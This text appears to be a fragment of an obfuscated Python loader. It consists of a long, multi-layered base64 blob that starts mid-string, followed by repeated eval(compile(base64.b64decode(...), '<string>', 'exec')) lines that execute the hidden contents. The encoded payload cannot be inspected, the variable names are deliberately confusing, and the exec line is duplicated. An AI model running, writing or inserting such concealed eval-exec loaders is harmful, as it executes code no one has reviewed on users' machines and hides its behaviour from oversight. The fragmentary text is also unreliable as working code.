VwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTWsxNVZtNU9ZV0ZVVmpWWGJHUlRZMGRPZEZadGNGcE5iWGd5V1cweFIyVlZkRWxXVnpWclRXeGFjRlJFU2tkTmJVWlpWRzVhVDJGWFRuZFJNbXhDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJLYzFscmFFOWlSVGx1WWpKa1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVTBVMWMxbHJaRnBrVjA1MFZtMTBhRmRGY0hOWFZFcFBZMGRKZVU1WGFHcGhWMmQ0VTJwT2EySkdiSEJQVjJocllsZDRObGx1Y0dwaWEzUlNZakprU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVaTVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNWEJJVm01U2FXVlZSVFZUVldoUFlrZEtTRmRZVm1wU2Vtd3lXV3ROTVdKc2NGbFZWemxMVFcxNE5WUkhNVTlrYlVwMFYyNUNZVTFVYkROWFZtaExZVWRLV0ZacVFtRlhSV3gxVXpGTk1XSnNjRmxWYlZwcVVqQmFOVmRXWTNkaU1XdDZVMWhPU2xKNmJETlhiR014WWtkT2RWRllWbFpOVmxwU1ZXeGFTMVpzVlhkV2JFNVpUVWQ0UmxSRlRrSmliSEJJVW1wQ1dsWXdjRzlaZWtwV1pGWnNXRlJ0Y0dGWFJUVTJWRWN4VTJKSFNsaFBSelZOVVRCS2NsZHNaR0ZoUjFKWVpVUkNVVlV5VGpSVGJtd3pXakZyZVU5WVZtdFNNVmt3V2tWUmVGUXlTWGxPVjNoTVZWYzVibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDVXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUmFUVEEwZDFreWJFSlBWV3hKVkdwQ2FtRlZSblpYYTJSSFRVZEplbFJ0U2t0TmF6VXlXVzAxVTJGRmIzaE5TRUpFWVZWR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZXTXhUVmRLVlZKWFpGRlZNRVl3VkZaR2Rsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVzVXYTFaNlFqVlRWVkYzV2pCNFZWSlZkRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxsdE5WZGtSVEUxVVZSc1NsRjZRalJSTW14Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFaGlSekZLVWpOb2MxbHRiRzloYlUxNlZXNXNURlV3UlhKVVYzQjJVekJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WWXpGTlYwcFZVbTV3YTFORmJHNVZSazVEWVcxTmVsVnViRmhsYTFVeVZFWlNSMXBGVG5CUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1RFpGZFNXRTFJYUVwU1JFSnVXVlpqTVUxRmRFaE9WRVpwVmtWYU5scEZhRXBqUlU1d1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1EyUlhVbGhOU0d4S1VrUkNibGxXWXpGTlJYUklWRzV3YTFORmNHbFVSbEpIV2tWMFVtSXlaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNa3AxVm01U1RtVlZSVFZUVldNeFRWZEtWVkpZV2sxTmFsVjRXV3hTU2xNd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGthRll4Ykc1WmEyUlhaRlYwU0ZSdWNHdFRSV3gzVTFWU00wOVZNWEJSYmxwcVlWVktNVnBHWTNkbFJYQllUbFJHYVZaRmJHNVRWbEYzV2pBeFJGRnVXbXBoVlVveFdrWmpkMlZyYkVWa2VteE9VVEJLTWxreWJFSmlNWEJJVW1wQ2FVMHdOV2xUYWtwUFlVZEtkVlZ0V21sV01uZ3hVMnBGZDBzd05VVlVXR3hPVWtWR2JsZFdZekZoTUd4SVZXMTRhVlo2YkdsWlZtTXhUVVYwU0ZWdGVHbFdlbXhwVkVaU1IxcEZkRmROUjJSUlZrUkNibE51Y0ZwaWEzUlVVVzVhYW1GVlNuSlhWbWhUWkcxTmVHTXlOVnBOYW13eFdrVmtSbUpzYUZSUlZHaFJWVEJHTTFReVpIWmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVXWHBLVjJNeGNIQk9XR3hoVmpGS2Qxa3lNVmRoYkd0NVlraGFhV0pWV2pWVE1HaFdZbTFSZVZadGJFMU5hMWw1V1Zab1QyUnJNWEJaTTBKRVlWVkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVVoyV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUmJrSmhZVlZLTVZscVRsSmFNV3haVVc1T2FGWnFiSEpYYkdoUFlWZEtTRTlZYUd0V01WcHZWMnRrUm1JeVRYbFdiazVoWVZoa2JsZHJaRWROUjBsNlZHMUtTMDFyTlRKWGEyUnpZbTFKZUU5WGVHbGliRW8xVjFaa1UyRkZiM2hOU0U1S1VqRktiMXBGWXpWbGJHUTFXa2R3YVUxc1NuZFhha2sxV214d1NGWnVjRnBpV0dneVdURm9WMkpIU2pWYVIxSk5VVEJLY2xkV2FGTmtiVTE0WXpJMWFrMXJXbnBhUlU1cldrVjBWRkZ0YUdsaVZrWnVXVzB3TlUxRmJFaGpTRnBhWWtSc2QxZHJVblpUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWb1QySkhTa2hYV0ZacVlsWmFjbGxXYUV0aVJtdDVWRzVDYVUxcVZtOVpNbXh2VFZWdmVscEhlRnBoVkd4dldrY3hjMlZ0U2paU1Z6Vk1WVmM1VEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqSkdXRmRYWkZwWFJVcDZXVlpaTldFeGNGbFViV3hwVW5wc05GcEdaRmRoUm5CSVVsYzVhazFzV25wWGJXd3pXakZ3U0ZKcVFtbE5NRFZwVTJwS1QyUnNjRWhpUnpWcFRWUnNjMWx0TlZObFZteFlWVzFvUzAxVVFucFRWV1JUWVVkU1NFOVljRmhsVjFKeFdXcEtVMk5HYjNsUFYxcGhVakZhTmxkWE1UUmtiVTVaVm0xNGFXVlhVbXRVUlU1RFlURnNXVlZ1V21wTldFNTFXWHBLUjJNeVVrUmFSMUpNVlRCS01sa3liRUppTVhCSVZtNVNhVTFZVW5kWmJUVlNZakZ3U0ZadVVtbE5XRTR3VkZaWmQyTkdhRlJSVkd4UlZUQkdkVlJ0YkdwYU1XeFlUbGQwU2xKNlZYaFpiRkpPV2pGQ1JVMUhaR0ZTTUZsM1dXcE9UMWxyYjNsVWJXaHBZbXhLYlZsc1pITmtWVzk0VFVoQ1NsSkhPVXhUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVTBWS2IxbDZUazVUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpHRldNMmcyVjJ4U2RsTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWV2hQWWtkS1NGZFlWbXBpVmxweVdWWm9TMkpHYTNsVWJrSnBUV3BXYjFreWJHOU5WVzk2V2tkNFdtRlViRzlhUnpGelpXMUtObE5YTlV4VlZ6bHVVMVZPUWxvd2JFUlJWMlJLVWpGYWVsbDZTbFpPYTA1d1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFRSVFZ6V1d0a1dtUlhUblJXYlhSb1YwVndjMWRVU2s5alIwbDVUbGRvYW1GWFozaFRhazVyWWtac2NFOVhhR3RpVjNnMldXNXdSbUpyZEZKaU1tUktVVEJHYmxOVlRrSmFNR3hJVkc1c1RXSlZOWHBaYWs1UFlrVjBSR0V3ZEVwUk1FWnVVMVZHZGxvd2JFUlJWMlJLVVRCR2JsTlZhRmRqUm5CRVVWUnNTbE5GTlhOWmEyUmFaRlpuZVdWSVdtRk5iWGd4VXpCa1UyRlZlRVJSYms1cFRXMVNkMWx0YkROYU1rNUlVbTV3YWsweVVqSlpNakZTWTBWT2NGRlhaRXBSTUVadVUxVk9RbG95UmxoWFYyUnJWako0Y2xOVlVYZFBWV3hJVDFoa1lWWjZWbk5aTWpWQ1pGWlZlRlpzUmxOV2EzQlhWbFJDVjFVeFozZGlSVlpRV2pJNWJsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNZV3RzUjFScVJscE5helZ6V1hwT1QySlhVbGhsU0U1c1ZUQktlbGxxU210aWJIQllWVmRrYUZaNlVtNVhWbWhPV2pGc1dGVnVVbWhXZWxKdlVUSnNRbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVkZka1VsZEdTWGRYYkdONFpESlNSRkZxUW1sbFZVcDFXa1prVjJWdFRqVlJha0pvVWpGV2JscEVTbGRoVld4SVUyMW9hazFzVm01YVJtaExZekI0Y0U1SVZrUmhWVVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WWkhOaVZXeEpWbTV3WVZkRmNHMVhWbVJyWWtkS2RWVnRXbUZXZWxWNVUxVmtSMlJXY0VSUmFrWnFUV3hhTlZkRVNrZGliSEJZVGxSQ1dVMXNXakZhUjJzeFlteHdXVlZYT1V0TmEzQnZXWHBLVjFwdFNraFBWM0JhVjBaS2QxbHFTVEJpYTNSVllqQjBTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRWhVYm14S1VrUkNibGw2U2xkak1YQndUbGhrYVUxcWJIcFVSekZQVFZkT2RWUnVXbXBoVjJSM1VUSnNRbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdTWGRaTWpWeVRtdE9jRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtXbUpWV2paWGJFNUNUMVZzU1ZadWNHRlhSWEJ0VjFaa2EySkhTblZWYlZwaFZucFZlVll6Ykd0aFZteFpWRzE0V1UxdWFESlhWRXBIVFVkR1dFOVlWa3ROVkVKTVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1RFUyeEZlRkZYWkZGVk1FbzJWMnhrTkdKVmVIVlJibHBwVFc1b2FWTnFTbk5sVlhoMFZHNWFhV0pXY0hkWGFrVTFaREZzV1ZOdGFHbFdNVmwzVjJ4b1NtSnNhRkppTW1SS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBTTW5oMFUxVmpNV1J0VWtSUmEzQlNUVlZHTVZkcVNsZE5SbWQ2VVcxb2FtSlZXakJUTUdSUFpWVjRSRkZxUm1oV01VWjZVMVZPYTAweGNGaFRXRlphWWxWYU5sZHNUVEZOVjA1MFpETldZV0pyY0hOWGJHaDNZa1Z3TldGNldrUmhWVVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JtSkZVbFpSZWxZMlYyeG9VMXB0VGtoU2JteGFWbnBDZGxkVVRrcGpNR3hKVm01Q1lWRXpaRzVUYWs1cllrWnNjRTVYYkZwWFJUVnpWRWMxVjJWWFNrUlpNMDVLVWpCd2IxbDZTbFpqUlU1d1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSYVRUQnNNVmRVU1RWa1IwcFlZa1JDVEZFeWRFeFRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVakZaTUZkVVNsZGtNbEpFVVd0YWJGSXdOWE5aTUdoVFkwZEplVTVFV2tSaFZVWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01WFJFbzBaR3h2ZVZwSGVHcGhWRlp6V2xWa1QySkhUa2xWYmtKcFRXcFNkbE5YZEdGaFIwWllaVWQ0WVZFd1NYZFpibXhEVFZkT1NGVnRhR3RTTVZadVdrUktWMkZWZUhSVGJXaHFUV3hXTVZwR2FFdGpNR3hJVkc1YWFXSldjSGRYYWs1WFpWWnNXVlZ1UW1sTmFsSnVXVEJrUjJWV2JGaE5WM2hyVWpGYU5WTlhiSEpUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWa1lXTkhTblJTYms1cFUwZHpNbEV5YkVKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG94YTNwVFdGWmFUVzVvTWxsNlNsWmlNSFJTWWpKa1NsRXdSbTVUVlU1Q1dqQnNTVk50ZUd0VFJsbzFXVzFzUTAxWFJsaFZWREJwUTIxV01sbFhkMjlaTWpsMFkwZHNjMXBUYUdsWldFNXNUbXBSZFZscVdUQmFSMVpxWWpKU2JFdEhPVkJVZWtKMllqSTVVRlI1YTNOSlEwazRZek5TZVdGWE5XNVFhVWx6U1VOa2JHVkhWbXBLZVd0d0lncGxkbUZzS0dOdmJYQnBiR1VvWW1GelpUWTBMbUkyTkdSbFkyOWtaU2h2VDA4d2IyOXZUMDhwTENBaVBITjBjbWx1Wno0aUxDQW5aWGhsWXljcEtRPT0iCmV2YWwoY29tcGlsZShiYXNlNjQuYjY0ZGVjb2RlKG9PTzBvb29PTyksICI8c3RyaW5nPiIsICdleGVjJykp"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))